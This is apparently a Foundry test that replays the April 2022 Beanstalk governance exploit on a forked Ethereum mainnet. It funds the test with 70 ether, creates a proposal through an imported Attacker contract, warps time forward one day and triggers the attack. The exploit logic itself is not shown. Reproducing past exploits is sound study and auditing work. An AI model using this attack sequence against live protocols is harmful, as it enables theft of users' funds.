// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/beanstalk-april-2022/Attacker.sol";

contract AttackerTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 14595905);
        vm.deal(address(this), 70 ether);
    }

    function testAttack() public {
        Attacker attacker = new Attacker();

        attacker.proposeBip{value: 70 ether}();

        console.log("Proposal created, warping, %", block.timestamp);
        vm.warp(block.timestamp + 1 days);  // travelling 1 day in the future
        console.log("Warped, %s", block.timestamp);
        
        attacker.attack();
    }
}
